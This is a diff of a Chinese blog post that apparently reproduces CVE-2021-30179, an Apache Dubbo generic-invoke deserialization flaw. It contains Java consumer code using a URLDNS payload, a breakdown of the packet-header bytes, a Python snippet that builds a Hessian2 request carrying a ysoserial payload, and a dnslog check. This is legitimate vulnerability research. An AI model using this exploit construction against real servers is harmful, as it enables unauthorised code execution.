@@ -64,7 +64,7 @@ if (ProtocolUtils.isJavaGenericSerialization(generic)) {
 </dependency>
 ```
 
-把$invoke的参数换成URLDNS的payload，运行consumer
+把`$invoke`的参数换成`URLDNS`的payload，运行consumer
 ```java
         ReferenceConfig<GenericService> reference = new ReferenceConfig<GenericService>();
         reference.setInterface(DemoService.class);
@@ -111,30 +111,35 @@ if (ProtocolUtils.isJavaGenericSerialization(generic)) {
 |96 ~ 127|	消息体长度|	运行时计算|
 
 这个跟我们的报文没什么关系，按抓包默认的设置就好，长度按照最终body算即可，可以跟抓到的包对应上
+|字节  |	含义|
+|:----|:----|
+|\xda\xbb   	|						魔数 |
+|\xc2     |  							11000010，序列化器为2，即Hessian2Serialization   |
+|\x00       	|						status|
+|\x00\x00\x00\x00\x00\x00\x00\x00|   id|
+|\x00\x00\x02j       |				len|
 
-```java
-\xda\xbb   							魔数 
-\xc2       							11000010，序列化器为2，即Hessian2Serialization       
-\x00       							status
-\x00\x00\x00\x00\x00\x00\x00\x00    id
-\x00\x00\x02j       				len
-```
 
 后面就是各个字段的Hessian2反序列化，从Dubbo的编码代码可以看出来各字段的顺序
+
+1.dubboVersion
+
+2.path
+
+3.version
+
+4.methodName
+
+5.methodDesc
+
+6.paramsObject
+
+7.map
 
 ```java
 protected void encodeRequestData(Channel channel, ObjectOutput out, Object data, String version) throws IOException {
         RpcInvocation inv = (RpcInvocation) data;
-		/*
-		Hessian2序列化顺序：
-			1.dubboVersion
-			2.path
-			3.version
-			4.methodName
-			5.methodDesc
-			6.paramsObject
-			7.map
-		*/
+	
 
         out.writeUTF(version);
         // https://github.com/apache/dubbo/issues/6138
@@ -192,20 +197,22 @@ def hessian2_writeBytes(obj):
 
 ```python
 # body
+
 body = hessian2_writeString('2.0.2')
 body += hessian2_writeString(service_name)
 body += hessian2_writeString('0.0.0')
 body += hessian2_writeString('$invoke')
 body += hessian2_writeString('Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;')
 body += hessian2_writeString(func_name)
-body += b'q'                                        # length of array, number of arguments + 'p' 
-body += hessian2_writeString('[string')             # array type
-body += hessian2_writeString(parameter_desc)        # argument type
-body += b'q'                                        # length of array, number of arguments + 'p' 
-body += hessian2_writeString('[object')             # array type
-body += hessian2_writeBytes(yso_payload)            # serialized data
+body += b'q'                                        
+body += hessian2_writeString('[string')            
+body += hessian2_writeString(parameter_desc)        
+body += b'q'                                      
+body += hessian2_writeString('[object')           
+body += hessian2_writeBytes(yso_payload)           
 
 # config map
+
 body += b'H'
 body += hessian2_writeString('path')
 body += hessian2_writeString(service_name)
@@ -232,3 +239,12 @@ ls命令获取服务信息
 dnslog拿到数据，反序列化成功
 ![](/img/in-post/CVE-2021-30179/6.png)
 
+​	
+
+## 参考
+
+[https://articles.zsxq.com/id_bal6vf42e40t.html](https://articles.zsxq.com/id_bal6vf42e40t.html)
+
+[https://dubbo.apache.org/zh/docs/v2.7/dev/source/service-invoking-process/](https://dubbo.apache.org/zh/docs/v2.7/dev/source/service-invoking-process/)
+
+[https://www.anquanke.com/post/id/197658#h2-4](https://www.anquanke.com/post/id/197658#h2-4)
